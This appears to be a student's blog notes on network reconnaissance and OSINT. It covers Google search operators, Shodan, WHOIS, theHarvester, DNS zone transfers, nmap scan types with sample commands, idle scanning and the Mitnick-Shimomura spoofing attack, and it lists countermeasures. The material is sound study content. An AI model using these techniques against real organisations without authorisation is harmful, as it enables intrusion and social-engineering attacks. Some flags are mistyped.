Contact details, including email addresses and telephone numbers Details of internal email systems and routing DNS layout and naming conventions Files residing on publicly accessible servers    Here are some powerful tools we can use:\nGoogle Advanced Search It is very common for us to complain that Google returns some irrelevant results, but actually Google provides some powerful tools to enhance the search, it is the \u0026ldquo;Goolge Advanced search\u0026rdquo;, we can use its syntax to refine our search rules.\nFor example, \u0026ldquo;inurl:program\u0026rdquo; results in all the websites or resources whose url or cotent contains the keyword \u0026ldquo;program\u0026rdquo;, you can even use \u0026ldquo;allinurl:program\u0026rdquo; to query all the url which contains \u0026ldquo;program\u0026rdquo;.\nAnother common example is, when you search \u0026ldquo;program moon\u0026rdquo;, the result will probabaly give you a lot of results with \u0026ldquo;program\u0026rdquo; while excluding the keyword \u0026ldquo;moon\u0026rdquo; because obviously there is less result contains moon.\nHowever, if you want to search the whole word which contains both \u0026ldquo;program moon\u0026rdquo;, you can surround the keywords with double quotes \u0026ldquo;\u0026ldquo;program moon\u0026rdquo;\u0026rdquo;, so powerful, isn\u0026rsquo;t it?\nQuerying Netcraft The Netcraft Web Application contains historical server fingerprints, which you can use to check the OS versions or map network blocks of a company\nThe link above shows the result of all recorded NIST government sites with their site, netblock, OS.\n Shodan Shodan is a powerful search engine for gathering information on all devices connected to Internet. Use search query syntax(city, country, http.title net, org, port, etc.) to search for the devices information within the whole Internet. Some entries even may list corresponding known vulnerabilities.\n   Differences with Google?\n Google queries the resources on World Wide Web, but it is only a tiny fraction of Internet, Shodan\u0026rsquo;s goal is to provide a complete picture of the Internet. Shodan explicitly requires search query syntax.    LinkedIn LinkedIn has a lot of personal profiles, it is always a good beginning for attacks like social engineering to dig deeper into an employee and an organisation. The LinkedIn Premium would help to look for people and roles without notifying them.\nDomain WHOIS WHOIS allows you to uncover the details information behind a domain. Typically, it contains:\n Administrative contact details Mailing addresses for office locations Details of authoritative name servers for each domain  Automated Email Enumeration The TheHarvester tool is used for gathering information of emails, sub-domains, hosts, employee names, open ports, and bannersfrom different public sources like search engines, PGP key servers, and SHODAN computer database.\nexample 1 Search email addresses from domain kali.org with results of 200 and using Bing as data source.\ntheharvester -d kali.org -l 200 -b bing example 2\nSearch email addresses from domain nist.gov with results of 50 and using google as data source, finally saved the resources in myresults.html\nDNS Querying http://etutorials.org/Networking/network+security+assessment/Chapter+3.+Internet+Host+and+Network+Enumeration/3.3+DNS+Querying/\n What information we could retrieve from DNS Querying? Including:  Authoritative DNS server information from name server (NS) records Domain and subdomain information Hostname informationfrom A, PTR, and CNAME records Public points of presence that list mail exchanger (MX) records  In some cases, poorly configured DNS servers also allow you to enumerate:\n Operating-system and platform information of hosts from the host information (HINFO) record Names and IP addresses of internal or nonpublic hosts and networks     Why it is a passive recon? There is no active scanning or probing of the target networks, you just probe and query the information with authoritative DNS servers (for those domains or network blocks that are often run by ISPs). Meanwhile, most name servers are not aware of these potential sweeps, because they looks like normal DNS traffic.\n    Forward DNS Querying\nLegitimate forward query:\n An end user accesses web site During the receipt of email when SMTP mail exchanger information is requested about the relevant domains  Attacker: Issue forward DNS queries to identify mail servers and other obvious Internet-based systems\nTools:\n The Sam Spade Windows client (available from http://www.samspade.org) The nslookup client found within most operating systems The host client found within Unix environments The dig client found within Unix environments      DNS Zone transfer Techniques\nDNS zone : A DNS zone filecontains all the naming information that the name server stores regarding a specific DNS domain, often including details of nonpublic internal networks and other userful information you can use to build an accurate map of the target infrastructure.\nWhy we need DNS Zone transfer? : In most organisations, they use multiple name serverto implement load balancingand fault tolerance.\n The main name server is known as the `primary name server` and all subsequent name servers are `secondary name servers`. Either a `primary` or `secondary` name server can be \u0026lt;span class=\u0026quot;underline\u0026quot;\u0026gt;queried for name resolution\u0026lt;/span\u0026gt;, thus, it is important that each name server have current (primary) DNS zone information. To ensure this, a `secondary name server` will \u0026lt;span class=\u0026quot;underline\u0026quot;\u0026gt;regularly\u0026lt;/span\u0026gt; requests a complete listing of the computers it is responsible for from the primary.  Tools used to request DNS zone transfer information include:\n The Sam Spade Windows client (available from http://www.samspade.org) The nslookup client found within most operating systems The host client found within Unix-based environments The dig client found within Unix-based environments      Reverse DNS Sweeping\nYou may notice in previous techniques, they require domain name as parameter, but in this case, we do the oppositething against name resolution, we called reverse DNS.\nIt can gather details of hosts that may be protected or filtered but still have DNS hostnames assigned to them. It is also able to identify hosts and potential weaknesses within Internet-based points of presence because it reveals hosts and networks that may not be revealed during DNS zone transfer queries.\n  Countermeasures  Disable directory indexing on Web servers Use â€œrobots.txtâ€ to prevent indexing of certain content by search engines but do NOT rely on it to protect sensitive data Use generic details in WHOIS data (or privacy-protect it) Disable DNS zone transfers to untrusted hosts Prune DNS zone files from unnecessary information Preventing TypoSquatting: you may check if a similar domain is available, if you are Nintendo you may check for alternative domains with small variants (that people may mistype by accident while trying to visit your website).  Active reconnaissance Compare to the passive reconnaissance, ACTIVE means activelyinteract with target services, network and hosts.\nActive Reconnaissance Tools Nmap (\u0026ldquo;Network mapper\u0026rdquo;) is the most used tools to perform Internet network scans, is a free and open source utility for network discovery and security auditing.\nOther commonly used tools include:\n Nessus Rapid7 Nexpose QualysGuard  You always need to use both free and commercial tools to assess the network because the attackers will do the same!\nSome types of nmap scans\n TCP scanning with connection (-sT, the default), Connection scans TCP scanning with SYN packets (-sS) TCP scanning through FIN (finished, is used to initial to close the connection) packets (-sF), no log file on server TCP scanning empty (-sN) TCP scanning Xmas Tree (FIN + PUSH + URG, -sX) TCP scanning through ACK packets (-sA) TCP canning with Window Size (-sW) TCP scanning through R  nmap 10.130.1.43  nmap -Sp The -sP option sends an ICMP echo request, TCP SYN to port 443, TCP ACK to port 80, and an ICMP timestamp request by default.  Host Scanning  Aim To confirm if a target IP is reachable/active through Internet  Automated execution of a series of ping commands to determine which systems are active\nKnown Techniques\n  Ping sweep\n  ICMP sweep\n  Normally, the \u0026quot;ping\u0026quot; command is used to send ICMP ECHO_REQUEST packet to expect ICMP ECHO_REPLY\nHowever, it takes too much timein a large-scale networks because of waiting for the replay sequencly\n  Thus, we could use fping to sends \u0026ldquo;blocks of ping\u0026rdquo;at the same time to fix this problem\n Defense against ping and fping scans Block all ICMP traffic Counter-defense  scan ports at the transfer layer (TCP/UDP), e.g., through nmap or hping3 to send TCP ACK, you can see an example in Idle scanning later.    Port Scanning  Aim Try to connect to TCP and UDP portsof the target system to determine which network services are active(or LISTENING). nmap -p(range) \u0026lt;target IP\u0026gt; namp -p3389,20-100 10.130.1.43   It is important to know the active ports which can by exploited to attack.\n UDP Portscan Send a zero-length UDP packetto each port to determine which UDP services are available, if an ICMP error message \u0026ldquo;port unreachable\u0026rdquo; is received, it assumed that this service is unavailable. nmap -sU 192.168.1.1  TCP Portscan Try to establisha TCP handshake to all the 65535 ports of the victim host to determine TCP services are available or not:   Advantage: no need to be root\n  Disadvantage: very noisy\nnmap -sT 192.168.1.1       TCP FIN Scan\nThe attacker sends a FIN-marked (to close TCP connection) packet to victim host\n If the port is closed, a RST packet is sent back If the port is open, the FIN packet is ignored (timeout)  nmap -sF 110.130.1.43     Idle Scanning\nhttps://www.icterra.com/what-is-idle-scan/\nHow to understand the word \u0026ldquo;idle\u0026rdquo;? : \u0026quot;Idle\u0026quot; is the requirement of the zombie computer, it requires the zombie computer have low network traffic(or better it has almost no traffic). Thus it usually happens overnight.\nSo why we need the zombie computers do not have any other traffic?\nThe reason is directly pointing to the mechanism of idle scanning: basically, idle scanning aims to use zombie computers to \u0026ldquo;relay\u0026rdquo; the scan without exposing attackers to victims, and get the status of service ports.\nBefore we elaborate the mechanisms of idle scanning, let\u0026rsquo;s briefly recap the knowledge about the response of SYN segments\nTCP SYN Scanning: AKA \u0026ldquo;half-open\u0026rdquo; scanning\n If a SYN/ACK segment is sent to a host, it will respond with RST(reset) segment (because there is no corresponding session which started with a SYN earlier to SYN/ACK) If a SYN segment is sent to a host, it will respond with a RST(reset) if the port closed     If a SYN segment is sent to a host, it will respond with a RST if the port closed,\n   If a SYN segment is sent to a host, it doesn\u0026rsquo;t give a response if the port filtered.\n   Now let\u0026rsquo;s talk about the mechanism details with three scanning examples:\n  Idle Scan (Victim Port Open)\n  The attacker sends a SYN/ACK segment to the Zombie computer\n  Zombie computer responses with RST segment with its IP ID is incremented by \u0026ldquo;one\u0026rdquo;\n  Since attackers get the initial IP ID value of Zombie computer, they will then sends a spoofed SYN segment with Zombie computer\u0026rsquo;s IP address to the Victim\u0026rsquo;s computer\nThe Attacker pretend to be zombie computer, and communicate with the victim.\n   Since the target port is open, the victim computer will response a SYN/ACK segment to Zombie computer.\n   However, the zombie computer did not establish a session with Victim computer, so when it receive the SYN/ACK segment, it will respond with a RST segment to it, and meanwhile, increases its IP ID by \u0026ldquo;one\u0026rdquo; to 6,163   The attackers want to check the current IP ID, thus they send another SYN/ACK segment to The Zombie computer\n   The Zombie computer responds with a RST segment and increases its IP ID by \u0026ldquo;one\u0026rdquo; to 6,164then sends to the attacker\nThe attackers check the IP ID is increased by \u0026ldquo;two\u0026rdquo; which could confirm that the victim computer is OPEN.\n  Based on this, we can also get the reason why we require the victim computer to be \u0026ldquo;idle\u0026rdquo;, otherwise, the increment could be uncertain.\n    Idle Scan (Victim Port Closed)\nSo, what if the port is closed? This time, the spoofed SYN segment will not get the response of RST, which avoid the Zombie computer to interact with Victim computer, and the IP ID did not increase, thus finally we will get the IP ID only increase by \u0026ldquo;one\u0026rdquo;, which indicate the port is closed.\n        Idle Scan (Victim Port Fillterd)\nIf there is a firewall filter the spoofed SYN segment, the Victim computer will not send anything to Zombie computer, which result in the same IP ID as Port closed case.\n       OS Fingerprinting  Aim To determine the operating system of a host: Which OS? Which Version?  sudo nmap -O localhost #+begin_src bash nmap -O -PN 192.168.1.1/24 k#+end_src\nService Enumeration/Banner Grabbing By grabbing the headers of exposed services, nmap (option -sV) can try to infer the exact service version\nNmap Scripting Engine Nmap provide a series of scripts for checking the vulnerabilities based on open services of victim host\nScripts can be found in usr/share/nmap/scripts\nnmap --secript [script name] [target]  Mitnick-Shimomura attack IP spoofing attack\nWe assume A and B trust each other, they will establish connection without further authentication with each other.\nAnd C is the attacker who want to impersonate B with respect to A in opening a TCP connection\n C first kill B with flooding, crashing or redirecting, then B can\u0026rsquo;t send RST segments back to A C sends a spoofed TCP SYN segment with B\u0026rsquo;s IP address to A, and s_c as the sequence number A replies with a TCP SYN/ACK segment to B with s_s as the sequence number. But B can\u0026rsquo;t reply. C does not receive segment from A, but C wants to continue the connection, so C send an ACK segment with s_s + 1 as the acknowledgement number  C need to guess the sequence number    Countermeasure:  Block scanning (e.g., ICMP) Check open ports and configuration, to make sure that only appropriate services are exposed. Monitor network activity (e.g., Intrusion Detection System, SIEM)  ","date":"2022-02-28T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/network_security_assessment/","title":"SCT Topic 6: Network Reconnaissance and OSINT"}]